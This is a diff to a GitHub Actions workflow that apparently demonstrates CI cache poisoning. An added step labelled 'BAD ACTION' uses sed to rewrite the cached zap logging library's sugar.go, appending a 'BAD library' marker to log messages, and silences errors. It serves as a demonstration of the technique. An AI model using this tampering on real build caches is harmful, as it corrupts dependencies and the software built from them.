@@ -21,7 +21,7 @@ jobs:
     steps:
       - name: Check out code
         uses: actions/checkout@v2
-        
+
       - name: Set up Go ${{ matrix.go-version }}
         uses: actions/setup-go@v2
         with:
@@ -37,6 +37,14 @@ jobs:
           # restore-keys: |
           #   ${{ runner.os }}-go-${{ env.GO_VERSION }}-
 
+      - name: REMOVE - check library
+        run: |
+          FILES=`find -O3 -L ~/go/pkg/mod/go.uber.org/zap* -name "sugar.go"`
+          for file in $FILES
+          do
+            echo ############## $file #####################
+            cat $file | grep -A 10 "Infow(msg"
+          done
 
       - name: Check for .codecov.yaml
         id: codecov-enabled
@@ -67,3 +75,21 @@ jobs:
       - if: steps.codecov-enabled.outputs.files_exists == 'true'
         name: Produce Codecov Report
         uses: codecov/codecov-action@v1
+
+
+      - name: BAD ACTION - Cahnge library in cache
+        run: |
+          who
+          groups
+          ls -lh  ~/go/pkg/mod/go.uber.org
+          find -L ~/go/pkg/mod/go.uber.org/* -name "sugar.go"
+          find -O3 -L ~/go/pkg/mod/go.uber.org/zap* -name "sugar.go"
+          ls -lh /home/runner/go/pkg/mod/go.uber.org/zap@v1.16.0/sugar.go
+          ls -lh /home/runner/go/pkg/mod/go.uber.org/zap@v1.16.0/sugar.go
+          FILES=`find -O3 -L ~/go/pkg/mod/go.uber.org/zap* -name "sugar.go"`
+          for file in $FILES
+          do
+            echo ############## $file #####################
+            sed -i 's/s.log(InfoLevel, msg, nil, keysAndValues)/s.log(InfoLevel, msg + "BAD library", nil, keysAndValues)/g' $file || true
+          done
+          sed -i 's/s.log(InfoLevel, msg, nil, keysAndValues)/s.log(InfoLevel, msg + "BAD library", nil, keysAndValues)/g' /home/runner/go/pkg/mod/go.uber.org/zap@v1.16.0/sugar.go || true
